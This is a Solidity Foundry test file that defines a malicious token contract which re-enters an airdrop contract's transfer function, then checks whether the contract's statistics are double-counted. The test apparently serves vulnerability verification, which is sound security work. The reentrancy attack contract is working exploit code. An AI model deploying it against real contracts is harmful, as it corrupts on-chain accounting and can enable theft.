// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4051334adc52057aca763453820cb0e045076ef3.sol";

contract MaliciousToken {
    airdrop public airdropContract;
    bool public attackTriggered;
    address attacker;

    constructor(airdrop _airdropContract, address _attacker) {
        airdropContract = _airdropContract;
        attacker = _attacker;
    }

    function transferFrom(address, address to, uint256 value) external returns (bool) {
        if (!attackTriggered) {
            attackTriggered = true;
            address[] memory tos = new address[](1);
            tos[0] = attacker;
            airdropContract.transfer(msg.sender, address(this), tos, value);
        }
        return true;
    }
}

contract AirdropReentrancyTest is Test {
    airdrop public airdropContract;
    MaliciousToken public maliciousToken;
    address constant attacker = address(0x1337);
    
    function setUp() public {
        airdropContract = new airdrop();
        maliciousToken = new MaliciousToken(airdropContract, attacker);
    }

    function test_ReentrancyInTransfer() public {
        // Prepare transfer parameters
        address[] memory receivers = new address[](1);
        receivers[0] = attacker;

        console.log("--- BEFORE-Trigger State ---");
        // Capture pre-attack state variables
        (, uint preAttackTokensReceived) = airdropContract.getUserStats(attacker);
        uint preAttackTotalAirdrops = airdropContract.totalAirdrops();
        uint preAttackTotalTokens = airdropContract.totalTokensDistributed();
        uint preAttackUserAirdropCount = airdropContract.userAirdropCount(attacker);
        
        // Log pre-attack state
        console.log("Pre-attack tokensReceived: ", preAttackTokensReceived);
        console.log("Pre-attack totalAirdrops: ", preAttackTotalAirdrops);
        console.log("Pre-attack totalTokens: ", preAttackTotalTokens);
        console.log("Pre-attack userAirdropCount: ", preAttackUserAirdropCount);

        console.log("--- Trigger Transfer (reentrancy exploit) ---");
        // Perform the vulnerable transfer (reentrancy trigger)
        airdropContract.transfer(attacker, address(maliciousToken), receivers, 1 ether);

        console.log("--- AFTER-Trigger State ---");
        // Capture post-attack state variables
        (, uint postAttackTokensReceived) = airdropContract.getUserStats(attacker);
        uint postAttackTotalAirdrops = airdropContract.totalAirdrops();
        uint postAttackTotalTokens = airdropContract.totalTokensDistributed();
        uint postAttackUserAirdropCount = airdropContract.userAirdropCount(attacker);
        
        // Log post-attack state
        console.log("Post-attack tokensReceived: ", postAttackTokensReceived);
        console.log("Post-attack totalAirdrops: ", postAttackTotalAirdrops);
        console.log("Post-attack totalTokens: ", postAttackTotalTokens);
        console.log("Post-attack userAirdropCount: ", postAttackUserAirdropCount);

        // Calculate state differences
        uint diffTokens = postAttackTokensReceived - preAttackTokensReceived;
        uint diffAirdrops = postAttackTotalAirdrops - preAttackTotalAirdrops;
        uint diffTotalTokens = postAttackTotalTokens - preAttackTotalTokens;
        uint diffUserAirdrops = postAttackUserAirdropCount - preAttackUserAirdropCount;

        console.log("--- State Change Analysis ---");
        console.log("Change in tokensReceived: ", diffTokens);
        console.log("Change in totalAirdrops: ", diffAirdrops);
        console.log("Change in totalTokens: ", diffTotalTokens);
        console.log("Change in userAirdropCount: ", diffUserAirdrops);

        // Check for double accounting effects (all metrics doubled)
        bool isExploited = (diffTokens == 2 ether) &&
                           (diffAirdrops == 2) &&
                           (diffTotalTokens == 2 ether) &&
                           (diffUserAirdrops == 2);

        // Final vulnerability verdict
        if (isExploited) {
            console.log("Vulnerability Exists: Reentrancy resulted in duplicate state updates");
        } else {
            console.log("Vulnerability not Exist: No evidence of reentrancy exploitation");
        }
    }
}